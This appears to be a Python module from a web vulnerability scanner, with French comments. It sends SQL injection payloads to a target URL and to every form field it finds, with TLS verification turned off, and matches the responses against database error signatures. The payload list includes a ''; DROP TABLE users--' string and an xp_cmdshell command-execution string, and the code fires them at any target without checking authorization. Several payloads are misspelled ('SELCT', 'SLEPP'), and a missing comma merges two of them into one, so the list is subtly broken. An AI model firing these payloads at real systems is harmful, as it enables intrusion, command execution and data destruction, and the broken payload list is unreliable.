# Détection des injections SQL
import requests
import urllib3
from core.utils import find_forms

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SQLI_PAYLOADS = [
    "'", "' OR '1'='1",  "' OR '1'='1' --", " \" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "' OR 1=1#", "' OR 1=1/*",  "' UNION SELECT null, version()--", "' UNION SELECT null, database()--",
    "/*!50000 UNION SELECT null, version()*/", "'UNION SELCT null, user()--", 
    "' UNION SELCT null, table_name FROM information_schema.tables--", "1' OR '1'='1' --", "1' OR '1'='1' #"
    "'AND 1=CAST((SELECT @@version) AS INT)--", "' OR SLEPP(5)--",
    "'; EXEC xp_cmdshell('whoami')--", "'; DROP TABLE users--"
]

SQLI_SIGNATURES = [
        "You have an error in your SQL syntax",
        "Warning: mysql_fetch",
        "Unclosed quotation mark",
        "Microsoft OLE DB Provider",
        "SQLSTATE[",
        "ODBC SQL Server Driver",
        "Syntax error in string",
        "Unknown column",
        "Fatal error",
        "MySQL server version",
        "PostgreSQL query failed",
        "syntax error",  
        "mysql_fetch", 
        "database error", 
        "unterminated string", 
    ]


def scan_sqli(target, formated_target):
    """Teste l'injection SQL (SQLi)"""
    
    print(f"\n\t==============Scan SQLI sur -->{formated_target}<-- 🔍 ==============\n")
    
    
    vuln_found = False
    sqli_results = {}
    
    
    
    for payload in SQLI_PAYLOADS:
        test_url = f"{target}?input={payload}"
        
        session = requests.Session()
        session.verify = False
        try:
            response = session.get(test_url, timeout=5)
            print(f"[!]~] Test de l'URL SQLi : {test_url}")
            response_text = response.text.lower()
            
            if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
                print(f"[!!!] SQLi détectée dans l'URL : {test_url}")
                vuln_found = True
                sqli_results[test_url] = "VULNERABLE (URL Injection)"
                
        
        except requests.exceptions.RequestException as e:
            # print(f"[!][!][XXX] Erreur lors de la requête URL SQLi : {e}")
            pass
    
    forms = find_forms(target)
    
    
    if forms:
        for form in forms:
            action = form.get("action") 
            method = form.get("method", "get")
            inputs = form.get("inputs", [])
            
            target_url = target + action if action else target
            
            
            for input_field in inputs:
                field_name = input_field.get("name")
                if not field_name:
                    continue
                
                for payload in SQLI_PAYLOADS:
                    form_data = {field_name: payload}
                    
                    session = requests.Session()
                    session.verify = False
                    try:
                        if method == "post":
                            response = session.post(target_url, data=form_data, timeout=5)
                        else:
                            response = session.get(target_url, params=form_data, timeout=5)
                        
                        response_text = response.text.lower()
                        
                        if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
                            print(f"[!!!] SQLi détectée dans le formulaire `{field_name}` avec : {payload}")
                            vuln_found = True
                            sqli_results[target_url] = f"VULNERABLE - Champ {field_name}"
                        
                    
                    except requests.exceptions.RequestException as e:
                        # print(f"[!][!][XXX] Erreur lors de la requête : {e}")
                        pass
    
    if not vuln_found:
        print("\n✅  Aucun SQLi détecté.\n")
    
    return sqli_results